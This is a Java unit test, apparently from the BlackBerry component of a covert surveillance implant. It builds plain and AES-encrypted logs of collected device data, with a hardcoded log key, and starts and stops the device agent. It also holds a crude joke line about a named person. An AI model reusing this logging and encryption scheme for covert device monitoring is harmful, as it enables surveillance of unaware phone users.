package com.ht.tests.unit;

import com.ht.rcs.blackberry.Common;
import com.ht.rcs.blackberry.Device;
import com.ht.rcs.blackberry.Status;
import com.ht.rcs.blackberry.agent.Agent;
import com.ht.rcs.blackberry.config.Keys;
import com.ht.rcs.blackberry.fs.AutoFlashFile;
import com.ht.rcs.blackberry.fs.Path;
import com.ht.rcs.blackberry.log.Log;
import com.ht.rcs.blackberry.log.LogCollector;
import com.ht.rcs.blackberry.utils.Check;
import com.ht.rcs.blackberry.utils.Utils;
import com.ht.rcs.blackberry.utils.WChar;
import com.ht.tests.AssertException;
import com.ht.tests.TestUnit;
import com.ht.tests.Tests;

public class UT_Log extends TestUnit {

	public UT_Log(String name, Tests tests) {
		super(name, tests);
	}

	public boolean run() throws AssertException {

		Path.makeDirs(true);	
		
		CreatePlainDeviceLog();
		CreateEncDeviceLog();
		CreateDeviceAgent();
		return true;
	}

	private void CreatePlainDeviceLog() {
		Status status = Status.getInstance();
		status.clear();
		
		Device device = Device.getInstance();
		device.clear();

		Agent agent = Agent.factory(Agent.AGENT_DEVICE, Common.AGENT_ENABLED,
				null);

		Log agentLog = LogCollector.getInstance().factory(agent, true);

		// agent device vuoto
		byte[] additionalData = null;
		byte[] plain = agentLog.makeDescription(additionalData);

		Check.asserts(plain.length == 32, "Wrong len 1 ");

		AutoFlashFile file = new AutoFlashFile(Path.SD_PATH + "LOG_test1.log",
				false);
		if (file.exists())
			file.delete();
		file.create();

		file.append(plain.length);
		file.append(plain);

		// agent device con imsi ecc		
		device.refreshData();

		plain = agentLog.makeDescription(additionalData);
		Check.asserts(plain.length > 32, "Wrong len 2");

		file = new AutoFlashFile(Path.SD_PATH + "LOG_test2.log", false);
		if (file.exists())
			file.delete();
		file.create();

		file.append(plain.length);
		file.append(plain);

		String chunk = "Processore: Cray\nMemoria: a paccazzi\nOS: BB\nKiodo: gay\n";
		byte[] bc = WChar.getBytes(chunk);

		// chunk, a pezzi
		file.append(bc);

		// resto del chunk: 4*2 + 2
		byte[] picche = new byte[] { 0x60, 0x26 };
		byte[] fiori = new byte[] { 0x61, 0x26 };
		byte[] cuori = new byte[] { 0x62, 0x26 };
		byte[] quadri = new byte[] { 0x63, 0x26 };
		file.append(picche);
		file.append(fiori);
		file.append(cuori);
		file.append(quadri);

		file.append(WChar.getBytes("\n"));

		// secondo chunk in arabo
		String ArabicText = "44062706200023064E062A064E0643064E0644064E06510645064F06200027064406520639064E0631064E0628064A064E06510629064E06";
		String ArabicTraslitteration = "\nTraslitterazione: a atakallamu al-'arabi'yah";
		String ArabicTranslation = "\nmettete la salsa bianca nel kebab\n";

		byte[] arabic = Utils.hexStringToByteArray(ArabicText);
		
		file.append(arabic);
		file.append(WChar.getBytes(ArabicTraslitteration));
		file.append(WChar.getBytes(ArabicTranslation));
		file.append(0); // string null terminated
	}

	private void CreateEncDeviceLog() {

		// per la 296, logKey = s06El1fQksievo4rtX3XjHWe4lqgxBpZ
		// md5(logKey) = 4e400a3552be73aedb88077cef404314

		byte[] logKey = Utils
				.hexStringToByteArray("4e400a3552be73aedb88077cef404314");
		Keys.byteAesKey = logKey;
		Check.asserts(logKey.length == 16, "Wrong md5");

		Status status = Status.getInstance();
		status.clear();

		Agent agent = Agent.factory(Agent.AGENT_DEVICE, Common.AGENT_ENABLED,
				null);
		Log agentLog = LogCollector.getInstance().factory(agent, true);

		agentLog.createLog(null);

		String content = "BlackBerry 8300\n128Kb Ram installed";
		agentLog.writeLog(content, true);

		agentLog.close();

	}

	private void CreateDeviceAgent() {

		// per la 296, logKey = s06El1fQksievo4rtX3XjHWe4lqgxBpZ
		// md5(logKey) = 4e400a3552be73aedb88077cef404314

		byte[] logKey = Utils
				.hexStringToByteArray("4e400a3552be73aedb88077cef404314");
		Keys.byteAesKey = logKey;
		Check.asserts(logKey.length == 16, "Wrong md5");

		Status status = Status.getInstance();
		status.clear();

		Agent agent = Agent.factory(Agent.AGENT_DEVICE, Common.AGENT_ENABLED,
				null);

		agent.command = Common.AGENT_STOP;
		agent.agentRun();

		debug.trace("Agent Device ok");
	}
}
